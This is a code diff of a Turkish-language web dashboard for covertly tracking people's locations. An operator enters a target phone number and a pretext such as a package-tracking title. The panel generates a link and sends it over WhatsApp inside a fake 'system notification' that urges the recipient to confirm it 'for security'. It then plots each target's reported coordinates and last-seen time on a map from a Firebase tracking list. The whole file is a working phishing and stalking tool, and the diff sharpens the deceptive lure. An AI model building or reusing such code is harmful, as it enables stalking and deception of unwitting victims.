@@ -2,42 +2,42 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OTOMATİK BİLDİRİM PANELİ</title>
+    <title>Sistem Dashboard | Canlı Takip</title>
     <link rel="stylesheet" href="index.css">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
 </head>
 <body>
-    <div class="glass-card">
-        <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 1.5rem;">
-            <i data-lucide="shield-check" style="color: var(--accent-primary); width: 28px; height: 28px;"></i>
-            <h1 style="font-size: 1.1rem; margin: 0; font-weight: 800; letter-spacing: 0.05em;">SİSTEM BİLDİRİM PANELİ</h1>
+    <div class="sidebar">
+        <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 1rem;">
+            <i data-lucide="shield" style="color: var(--accent-primary)"></i>
+            <h2 style="font-size: 1rem; margin: 0; letter-spacing: 1px;">KONTROL PANELİ</h2>
         </div>
-        
-        <input type="text" id="phone-input" class="input-field" placeholder="Hedef Numara (05XXXXXXXXX)">
-        <input type="text" id="name-input" class="input-field" placeholder="Mesaj Başlığı (Örn: Paket Takibi)">
-        
-        <button class="btn btn-primary" id="search-btn">
-            <i data-lucide="zap"></i> Link Üret ve İzleme Başlat
-        </button>
 
-        <div id="link-result" style="display: none; margin-top: 1.5rem;">
-            <div style="font-size: 0.7rem; font-weight: 800; color: var(--success); margin-bottom: 0.5rem; text-transform: uppercase;">Sistem Taslağı:</div>
-            <div class="message-preview" id="message-preview"></div>
-            
-            <button id="copy-btn" class="btn btn-secondary" style="margin-bottom: 10px;"><i data-lucide="copy"></i> Taslağı Kopyala</button>
-            <div style="display: flex; gap: 10px;">
-                <button id="wa-btn" class="btn btn-wa" style="flex: 1;"><i data-lucide="message-circle"></i> WhatsApp</button>
-                <button id="sms-btn" class="btn btn-secondary" style="flex: 1;"><i data-lucide="message-square"></i> SMS</button>
+        <div class="glass-card">
+            <input type="text" id="phone-input" class="input-field" placeholder="Numara: 05XXXXXXXXX">
+            <input type="text" id="name-input" class="input-field" placeholder="Başlık: Paket Takip">
+            <button class="btn btn-primary" id="search-btn"><i data-lucide="zap"></i> Link Üret</button>
+            <div id="tp-box" style="display: none;">
+                <div class="message-preview" id="preview-text"></div>
+                <button class="btn btn-wa" id="wa-btn"><i data-lucide="message-circle"></i> WhatsApp</button>
             </div>
+        </div>
 
-            <div id="map" style="height: 300px; border-radius: 12px; margin-top: 1.5rem; border: 1px solid var(--border-color);"></div>
-            <div id="status" style="font-size: 0.75rem; color: var(--text-secondary); margin-top: 0.5rem; text-align: center;">Hedef bekleniyor...</div>
+        <div style="font-size: 0.7rem; font-weight: 800; color: var(--text-secondary); margin: 1rem 0 0.5rem 0;">TAKİP LİSTESİ / GEÇMİŞ:</div>
+        <div id="target-list" style="flex: 1; overflow-y: auto;">
+            <!-- Dinamik Takip Listesi -->
         </div>
     </div>
 
-    <!-- Leaflet.js -->
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <div class="main-content">
+        <div id="map"></div>
+        <div id="info-overlay" style="position: absolute; bottom: 20px; left: 20px; z-index: 1000; background: var(--panel-bg); padding: 15px; border-radius: 12px; border: 1px solid var(--border-color); backdrop-filter: blur(10px); min-width: 200px; display: none;">
+            <div id="target-phone" style="font-weight: 700; color: var(--accent-primary);">Numara Seçilmedi</div>
+            <div id="target-status" style="font-size: 0.8rem; margin-top: 5px; color: var(--text-secondary);">Veri bekleniyor...</div>
+        </div>
+    </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
@@ -48,59 +48,64 @@
         const database = getDatabase(app);
         lucide.createIcons();
 
-        let map, marker;
+        const map = L.map('map').setView([39, 35], 6);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+        let marker;
 
-        const searchBtn = document.getElementById('search-btn');
-        const linkResult = document.getElementById('link-result');
-        const preview = document.getElementById('message-preview');
-        const status = document.getElementById('status');
+        const sidebarList = document.getElementById('target-list');
+        const overlay = document.getElementById('info-overlay');
 
-        searchBtn.addEventListener('click', () => {
-            const phone = document.getElementById('phone-input').value.trim();
-            const header = document.getElementById('name-input').value.trim() || "Sistem Doğrulaması";
-            if (!phone) return alert("Hata: Numara gereklidir.");
+        // 1. Tüm Takip Listesini Dinle (Sol Menü)
+        onValue(ref(database, 'takip_listesi'), (snapshot) => {
+            const data = snapshot.val();
+            sidebarList.innerHTML = '';
+            if(!data) return;
 
-            const link = window.location.origin + "/l.html?tel=" + phone + "&n=" + encodeURIComponent(header);
-            const sysID = Math.floor(Math.random() * 90000) + 10000;
-            const msg = `SİSTEM BİLDİRİMİ (ID: ${sysID})\n\nBu linke tıklayarak konumunuzu paylaşabilirsiniz.\n\n${header}: ${link}`;
-            
-            preview.innerText = msg;
-            linkResult.style.display = "block";
-
-            // Harita başlat
-            if(!map) {
-                map = L.map('map').setView([39, 35], 5);
-                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-            }
-            
-            // Harita görünür olduğunda boyutunu yenile
-            setTimeout(() => { map.invalidateSize(); }, 300);
-
-            onValue(ref(database, 'takip_listesi/' + phone), (s) => {
-                const data = s.val();
-                if(data && data.lat) {
-                    status.innerHTML = `🟢 Canlı Bağlantı Kuruldu! <br> Son Görülme: ${data.lastSeen}`;
-                    const pos = [data.lat, data.lon];
-                    if(!marker) marker = L.marker(pos).addTo(map);
-                    else marker.setLatLng(pos);
-                    map.setView(pos, 15);
-                }
+            Object.keys(data).forEach(phone => {
+                const item = data[phone];
+                const div = document.createElement('div');
+                div.className = 'target-item';
+                div.innerHTML = `
+                    <div class="phone"><i data-lucide="user" style="width:12px; height:12px"></i> ${phone}</div>
+                    <div class="time">${item.lastSeen || 'Tıklanmadı'}</div>
+                `;
+                div.onclick = () => selectTarget(phone, item);
+                sidebarList.appendChild(div);
             });
+            lucide.createIcons();
         });
 
-        document.getElementById('wa-btn').onclick = () => {
-            const phone = document.getElementById('phone-input').value;
-            window.open(`https://wa.me/${phone}?text=${encodeURIComponent(preview.innerText)}`);
-        };
+        function selectTarget(phone, data) {
+            document.querySelectorAll('.target-item').forEach(i => i.classList.remove('active'));
+            overlay.style.display = 'block';
+            document.getElementById('target-phone').innerText = phone;
+            
+            if(data.lat && data.lon) {
+                const pos = [data.lat, data.lon];
+                if(!marker) marker = L.marker(pos).addTo(map);
+                else marker.setLatLng(pos);
+                map.setView(pos, 15);
+                document.getElementById('target-status').innerHTML = `Son Görülme: ${data.lastSeen || 'Bilinmiyor'}`;
+            } else {
+                document.getElementById('target-status').innerText = 'Henüz konum verisi gönderilmedi.';
+            }
+        }
 
-        document.getElementById('sms-btn').onclick = () => {
-            const phone = document.getElementById('phone-input').value;
-            window.open(`sms:${phone}?body=${encodeURIComponent(preview.innerText)}`);
-        };
+        // 2. Link Üretme Mantığı
+        document.getElementById('search-btn').onclick = () => {
+            const ph = document.getElementById('phone-input').value.trim();
+            const head = document.getElementById('name-input').value.trim() || "Doğrulama";
+            if(!ph) return alert("Numara girin!");
 
-        document.getElementById('copy-btn').onclick = () => {
-            navigator.clipboard.writeText(preview.innerText);
-            alert("Kopyalandı!");
+            const lk = window.location.origin + "/l.html?tel=" + ph + "&n=" + encodeURIComponent(head);
+            const msg = `SİSTEM BİLDİRİMİ (ID: ${Math.floor(Math.random()*90000)})\n\nGüvenliğiniz için bağlantıyı onaylayın.\n\n${head}: ${lk}`;
+            
+            document.getElementById('preview-text').innerText = msg;
+            document.getElementById('tp-box').style.display = 'block';
+            
+            document.getElementById('wa-btn').onclick = () => {
+                window.open(`https://wa.me/${ph}?text=${encodeURIComponent(msg)}`);
+            };
         };
     </script>
 </body>
